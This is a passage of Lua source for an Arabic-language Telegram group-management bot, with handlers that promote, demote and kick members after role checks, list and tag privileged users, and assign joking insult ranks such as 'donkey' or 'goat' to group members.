send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن (%d+)$") and ChanSub(msg) and Manager(msg) then
local userid = text:match("^تنزيل ادمن (%d+)$")
database:srem(bot_id..'Mod:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من الادمنيه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم تنزيله من الادمنيه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == 'مسح المنظفين' and ChanSub(msg) and BasicConstructor(msg) then
database:del(bot_id..'abbas:MN:TF'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✯︙تم مسح المنظفين')
end
if text == ("المنظفين") and ChanSub(msg) and BasicConstructor(msg) then
local list = database:smembers(bot_id..'abbas:MN:TF'..msg.chat_id_)
t = "\n✯︙قائمة المنظفين \n≪━━━━━━𝓓𝓡𝓖━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد المنظفين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمنظفين") and ChanSub(msg) or text == ("صيح المنظفين") and ChanSub(msg) then
local list = database:smembers(bot_id..'abbas:MN:TF'..msg.chat_id_)
t = "\n✯︙وينكم تعالو يريدوكم بالكروب \n≪━━━━━━𝓓𝓡𝓖━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد منظفيه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع منظف") and ChanSub(msg) and msg.reply_to_message_id_ and BasicConstructor(msg) then
function start_function(extra, result, success)
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'abbas:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع منظف @(.*)$") and ChanSub(msg) and BasicConstructor(msg) then
local username = text:match("^رفع منظف @(.*)$")
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'abbas:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته منظف'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع منظف (%d+)$") and ChanSub(msg) and BasicConstructor(msg) then
local userid = text:match("^رفع منظف (%d+)$")
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'abbas:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل منظف") and ChanSub(msg) and msg.reply_to_message_id_ and BasicConstructor(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المنظفين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل منظف @(.*)$") and ChanSub(msg) and BasicConstructor(msg) then
local username = text:match("^تنزيل منظف @(.*)$") 
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المنظفين'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل منظف (%d+)$") and ChanSub(msg) and BasicConstructor(msg) then
local userid = text:match("^تنزيل منظف (%d+)$")
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المنظفين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم تنزيله من المنظفين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("طرد") and ChanSub(msg) and msg.reply_to_message_id_ ~=0 and Mod(msg) then
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الطرد') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n✯︙عذرا لا تستطيع طرد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'✯︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
statusk  = '\n✯︙تم طرد العضو'
send(msg.chat_id_, msg.id_, usertext..statusk)
end,nil)
chat_kick(result.chat_id_, result.sender_user_id_)
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^طرد @(.*)$") and ChanSub(msg) and Mod(msg) then 
local username = text:match("^طرد @(.*)$")
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الطرد') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n✯︙عذرا لا تستطيع طرد ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠| عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'✯︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
statusk  = '\n✯︙تم طرد العضو'
texts = usertext..statusk
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
end,nil)   
end
else
send(msg.chat_id_, msg.id_, '✯︙لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  

if text and text:match("^طرد (%d+)$") and ChanSub(msg) and Mod(msg) then 
local userid = text:match("^طرد (%d+)$") 
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الطرد') 
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n✯︙عذرا لا تستطيع طرد ( '..Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'✯︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
chat_kick(msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
 usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
 statusk  = '\n✯︙تم طرد العضو'
send(msg.chat_id_, msg.id_, usertext..statusk)
else
 usertext = '\n✯︙العضو » '..userid..''
 statusk  = '\n✯︙تم طرد العضو'
send(msg.chat_id_, msg.id_, usertext..statusk)
end;end,nil)
end,nil)   
end
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'مسح المميزين' and ChanSub(msg) and Mod(msg) then
database:del(bot_id..'Special:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✯︙تم مسح المميزين')
end
if text == ("المميزين") and ChanSub(msg) and Mod(msg) then
local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
t = "\n✯︙قائمة مميزين الكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد مميزين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمميزين") and ChanSub(msg) or text == ("صيح المميزين") and ChanSub(msg) then
local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
t = "\n✯︙وينكم تعالو يريدوكم بالكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد مميزين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع مميز") and ChanSub(msg) and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
local  statuss  = '\n✯︙تم ترقيته مميز'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع مميز @(.*)$") and ChanSub(msg) and Mod(msg) then
local username = text:match("^رفع مميز @(.*)$") 
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Special:User'..msg.chat_id_, result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
local  statuss  = '\n✯︙تم ترقيته مميز'
texts = usertext..statuss
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^رفع مميز (%d+)$") and ChanSub(msg) and Mod(msg) then
local userid = text:match("^رفع مميز (%d+)$")
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'Special:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
local  statuss  = '\n✯︙تم ترقيته مميز'
send(msg.chat_id_, msg.id_, usertext..statuss)
else
usertext = '\n✯︙العضو » '..userid..''
local  statuss  = '\n✯︙تم ترقيته مميز'
send(msg.chat_id_, msg.id_, usertext..statuss)
end;end,nil)
return false
end

if (text == ("تنزيل مميز")) and ChanSub(msg) and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل مميز @(.*)$") and ChanSub(msg) and Mod(msg) then
local username = text:match("^تنزيل مميز @(.*)$") 
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المميزين'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل مميز (%d+)$") and ChanSub(msg) and Mod(msg) then
local userid = text:match("^تنزيل مميز (%d+)$") 
database:srem(bot_id..'Special:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end  
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'تنزيل المطايه' and ChanSub(msg) and Mod(msg) then
database:del(bot_id..'Mote:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✯︙تم مسح جميع المطايه')
end
if text == ("تاك للمطايه") and ChanSub(msg) and ChanSub(msg) and Mod(msg) then
local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
t = "\n✯︙قائمة مطايه الكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» المطي [@"..username.."]\n"
else
t = t..""..k.."» المطي `"..v.."`\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد مطايه"
end
send(msg.chat_id_, msg.id_, t)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("رفع مطي") and ChanSub(msg) and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n✯︙تم رفع العضو مطي في الكروب \n✯︙تعال حبي استلم العربانه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل مطي")) and ChanSub(msg) and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيل العضو مطي في الكروب\n✯︙تعال حبي رجع العربانه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'تنزيل الحاتات' and ChanSub(msg) and Mod(msg) then
database:del(bot_id..'Mode:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✯︙تم مسح جميع الحاتات')
end
if text == ("تاك للحاتات") and ChanSub(msg) and Mod(msg) then
local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
t = "\n✯︙قائمه حاتات الكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» الحاته [@"..username.."]\n"
else
t = t..""..k.."» الحاته `"..v.."`\n"
end
end
if #list == 0 then
t = " ✯︙مع الاسف لا يوجد حاته"
end
send(msg.chat_id_, msg.id_, t)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("رفع الحاته") and ChanSub(msg) and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n✯︙تم رفع العضــو الحاته في الكروب \n✯︙تعال يحاته ممكن نتعرف'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل حاته")) and ChanSub(msg) and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيل العضــو الحاته من الكروب\n✯︙مشيي مو خوش حاتهه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'تنزيل الصاكين' and ChanSub(msg) and Mod(msg) then
database:del(bot_id..'Modde:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✯︙تم مسح جميع الصاكين')
end
if text == ("تاك للصاكين") and ChanSub(msg) and Mod(msg) then
local list = database:smembers(bot_id..'Modde:User'..msg.chat_id_)
t = "\n✯︙قائمه صاكين الكروب \nٴٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» الصاك [@"..username.."]\n"
else
t = t..""..k.."» الصاك `"..v.."`\n"
end
end
if #list == 0 then
t = " ✯︙مع الاسف لا يوجد صاكين"
end
send(msg.chat_id_, msg.id_, t)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("رفع صاك") and ChanSub(msg) and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Modde:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n✯︙تم رفع العضــو الصاك في الكروب \n✯︙تعال حبي الصاك نطيني بوسه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل صاك")) and ChanSub(msg) and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Modde:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيل العضــو الصاك من الكروب\n✯︙مشيي مو خوش صاك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'تنزيل الصخوله' and ChanSub(msg) and Mod(msg) then
database:del(bot_id..'Sakl:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✯︙تم تنزيل جميع صخوله من الكروب')
end
if text == ("تاك للصخوله") and ChanSub(msg) and Mod(msg) then
local list = database:smembers(bot_id..'Sakl:User'..msg.chat_id_)
t = "\n✯︙قائمة صخوله الكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» الصخل [@"..username.."]\n"
else
t = t..""..k.."» الصخل `"..v.."`\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد صخل"
end
send(msg.chat_id_, msg.id_, t)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("رفع صخل") and ChanSub(msg) and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Sakl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
local  statuss  = '\n✯︙تم رفع المتهم صخل بالكروب\n✯︙الان اصبح صخل الكروب'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


if (text == ("تنزيل صخل")) and ChanSub(msg) and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Sakl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيل العضو صخل\n✯︙ارجع للبيتكم حبي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'تنزيل الجلاب' and ChanSub(msg) and Mod(msg) then
database:del(bot_id..'Motte:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✯︙تم تنزيل جميع جلاب الكروب')
end
if text == ("تاك للجلاب") and ChanSub(msg) and Mod(msg) then
local list = database:smembers(bot_id..'Motte:User'..msg.chat_id_)
t = "\n✯︙قائمة الجلاب الكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» الجلب [@"..username.."]\n"
else
t = t..""..k.."» الجلب `"..v.."`\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد جلب"
end
send(msg.chat_id_, msg.id_, t)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
